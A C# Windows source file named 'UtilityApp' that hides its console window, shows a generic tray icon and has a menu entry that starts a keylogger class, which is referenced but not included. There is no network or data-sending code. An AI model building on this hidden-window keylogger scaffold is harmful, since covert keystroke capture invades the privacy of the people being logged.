using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;

namespace UtilityApp
{
    enum Acts { NOTHING, EXIT, KEYLOG, BUSY };

    class Program
    {
        //Menu Options
        private static Acts acts = Acts.NOTHING;

        //Icon stuffs
        public static ContextMenu menu;
        public static MenuItem mnuExit;
        public static MenuItem mnuKLog;
        public static NotifyIcon notificationIcon;

        //Key Logger
        static KeyCatch keyLog = new KeyCatch();

        //Lazy WriteLine function
        static void WL(string line)
        {
            Console.WriteLine(line);
            return;
        }

        static void buildMenu()
        {
            menu = new ContextMenu();
            mnuExit = new MenuItem("Exit");
            mnuKLog = new MenuItem("KLog");
            menu.MenuItems.Add(0, mnuExit);
            menu.MenuItems.Add(1, mnuKLog);

            mnuExit.Click += new EventHandler(mnuExit_Click);
            mnuKLog.Click += new EventHandler(mnuKLog_Click);
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            Thread notifyThread = new Thread(
                delegate ()
                {
                    buildMenu();

                    notificationIcon = new NotifyIcon()
                    {
                        Icon = Properties.Resources.AppIco,
                        ContextMenu = menu,
                        Text = "Main"
                    };

                    notificationIcon.Visible = true;
                    Application.Run();
                }
            );

            notifyThread.Start();

            while (acts != Acts.EXIT)
            {
                switch (acts)
                {
                    case Acts.KEYLOG:
                        //menu.MenuItems.Clear();
                        notificationIcon.Visible = false;
                        keyLog.Run();
                        Console.WriteLine("Loggin Keys");
                        acts = Acts.NOTHING;
                        notificationIcon.Visible = true;
                        break;
                    case Acts.EXIT:
                        endApp();
                        acts = Acts.NOTHING;
                        break;
                    case Acts.NOTHING:
                    default:
                        //acts = Acts.NOTHING;
                        //Console.WriteLine(acts.ToString());
                        break;
                }
            }
            endApp();
        }

        //Generates the main menu
        static bool Menu()
        {
            Console.Clear();
            WL("Select one");
            WL("--------------");
            WL("1)            ");
            WL("2)            ");
            WL("4)            ");
            WL("5) Keylogger  ");
            WL("6) Quit       ");
            WL("--------------");
            //Application.Run();
            try
            {
                int run = int.Parse(Console.ReadLine());
                switch (run)
                {
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                        break;
                    case 5:
                        keyLog.Run();
                        break;
                    default:
                        //WL(run.ToString());
                        return false;
                        break;
                }
            }
            catch
            {

            }
            return true;
        }

        static void endApp()
        {
            notificationIcon.Dispose();
            Environment.Exit(0);
        }

        static void mnuExit_Click(object sender, EventArgs e)
        {
            WL("Closing");
            acts = Acts.EXIT;
            endApp();
        }
        static void mnuKLog_Click(object sender, EventArgs e)
        {
            acts = Acts.KEYLOG;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    }

    /*
        

        private static void menuItem_Click(object Sender, EventArgs e)
        {
            // Close the form, which closes the application.
            Debug.WriteLine("ASDASDASDASDASDASD");
            Application.Exit();
        }

        [STAThread]
        static void Main(string[] args)
        {
            tray.Icon = Properties.Resources.AppIco;
            
            contextMenu.MenuItems.AddRange( new System.Windows.Forms.MenuItem[] { menuItem });
            
            menuItem.Index = 0;
            menuItem.Text = "E&xit";
            menuItem.Click += new System.EventHandler(menuItem_Click);
            
            tray.ContextMenu = contextMenu;


            tray.Visible = true;

            int i = 0;

            while (Menu())
            {
                WL(i.ToString());
                i++;
            }
            
        }


        static bool Menu()
        {
            Console.Clear();
            WL("Select one");
            WL("--------------");
            WL("1)            ");
            WL("2)            ");
            WL("4)            ");
            WL("5) Keylogger  ");
            WL("6) Quit       ");
            WL("--------------");
            //Application.Run();
            try
            {
                int run = int.Parse(Console.ReadLine());
                switch (run)
                {
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                        break;
                    case 5:
                        keyLog.Run();
                        break;
                    default:
                        //WL(run.ToString());
                        return false;
                        break;
                }
            }
            catch
            {

            }
            return true;
        }

    }*/
}
